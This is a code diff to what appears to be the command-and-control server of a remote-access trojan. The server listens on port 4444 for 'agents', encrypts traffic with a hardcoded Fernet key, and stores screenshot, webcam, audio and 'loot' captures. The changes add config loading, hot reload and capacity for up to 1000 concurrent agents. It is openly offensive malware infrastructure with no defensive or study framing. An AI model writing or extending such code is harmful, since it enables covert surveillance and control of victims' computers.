@@ -14,6 +14,44 @@ import sys
 from cryptography.fernet import Fernet
 from datetime import datetime
 import time
+import sys
+sys.path.insert(0, os.path.dirname(__file__))
+
+from master_umbrella_setup import get_yaml_config, config_get, ConfigWatcher
+from agent_registry import AgentRegistry
+
+# ═══════════════════════════════════════════════════════════════════════════
+# INITIALIZATION
+# ═══════════════════════════════════════════════════════════════════════════
+
+# Agent registry
+agent_registry = AgentRegistry()
+
+# ═══════════════════════════════════════════════════════════════════════════
+# CONFIGURATION LOADING
+# ═══════════════════════════════════════════════════════════════════════════
+
+config = get_yaml_config()
+LISTEN_IP = config.get('server.listen_ip', '0.0.0.0')
+LISTEN_PORT = config.get('server.listen_port', 4444)
+API_PORT = config.get('server.api_port', 5000)
+CALLBACK_TIMEOUT = config.get('server.callback_timeout', 30)
+HEARTBEAT_INTERVAL = config.get('server.heartbeat_interval', 30)
+
+# Config watcher for auto-reload
+config_watcher = ConfigWatcher(config, check_interval=5)
+
+def on_config_change(new_config):
+    """Callback when configuration changes"""
+    global LISTEN_IP, LISTEN_PORT, API_PORT, CALLBACK_TIMEOUT, HEARTBEAT_INTERVAL
+    print(f"{Colors.YELLOW}[!] Configuration changed, reloading...{Colors.END}")
+    LISTEN_IP = config.get('server.listen_ip', LISTEN_IP)
+    LISTEN_PORT = config.get('server.listen_port', LISTEN_PORT)
+    API_PORT = config.get('server.api_port', API_PORT)
+    CALLBACK_TIMEOUT = config.get('server.callback_timeout', CALLBACK_TIMEOUT)
+    HEARTBEAT_INTERVAL = config.get('server.heartbeat_interval', HEARTBEAT_INTERVAL)
+
+config_watcher.subscribe(on_config_change)
 
 # ═══════════════════════════════════════════════════════════════
 # GLOBAL SESSION MANAGEMENT
@@ -528,9 +566,10 @@ def main():
     # Setup signal handler
     signal.signal(signal.SIGINT, signal_handler)
     
-    # Configuration
-    KEY = b'HBotDwpxC89EIMiuA6PA_8NI81hWHqGC6hiG0DbfUDY='
-    PORT = 4444
+    # Load configuration from master config
+    KEY = config.get('security.master_encryption_key', b'HBotDwpxC89EIMiuA6PA_8NI81hWHqGC6hiG0DbfUDY=')
+    PORT = LISTEN_PORT
+    HOST = LISTEN_IP
     
     # Banner
     banner = rf"""{Colors.CYAN}{Colors.BOLD}
@@ -549,20 +588,28 @@ def main():
     
     print(banner)
     
+    # Start configuration watcher
+    config_watcher.start_watching()
+    print(f"{Colors.GREEN}[+] Configuration watcher active{Colors.END}")
+    
     # Create directories
     os.makedirs('captures/screenshots', exist_ok=True)
     os.makedirs('captures/webcam', exist_ok=True)
     os.makedirs('captures/audio', exist_ok=True)
     os.makedirs('loot', exist_ok=True)
+    os.makedirs('logs/server', exist_ok=True)
+    os.makedirs('data/backups', exist_ok=True)
     
-    # Setup server
+    # Setup server with config
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    server.bind(('0.0.0.0', PORT))
-    server.listen(10)
+    server.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, config.get('server.buffer_size', 65536))
+    server.bind((HOST, PORT))
+    server.listen(config.get('server.max_concurrent_agents', 1000))
     server.settimeout(1.0)  # Non-blocking with timeout
     
-    print(f"{Colors.GREEN}[*] Server listening on port {PORT}{Colors.END}")
+    print(f"{Colors.GREEN}[*] Server listening on {HOST}:{PORT}{Colors.END}")
+    print(f"{Colors.GREEN}[*] API available on 0.0.0.0:{API_PORT}{Colors.END}")
     print(f"{Colors.YELLOW}[*] Type 'help' for command reference{Colors.END}\n")
     
     # Start connection acceptor thread
